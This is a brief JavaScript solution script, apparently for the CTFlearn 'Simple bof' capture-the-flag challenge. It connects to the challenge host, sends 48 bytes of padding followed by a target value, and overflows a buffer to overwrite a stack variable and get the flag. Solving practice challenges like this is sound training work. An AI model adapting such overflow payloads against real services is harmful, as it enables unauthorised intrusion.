/**
 * https://ctflearn.com/challenge/1010 (Simple bof)
 *
 * Overflow and overwrite
 */

const { Remote, convo } = require("..");

(async () => {
    const remote = Remote.create("thekidofarcrania.com", 35235);

    await remote.onceDataAsync('Input some text: ');
    const wantedValue = 0x67616C66; // given by chall

    remote.send("A".repeat(0x30));
    remote.send(convo.toBuffer(wantedValue));
    remote.send("\n");

    remote.pipeStdout();
})();
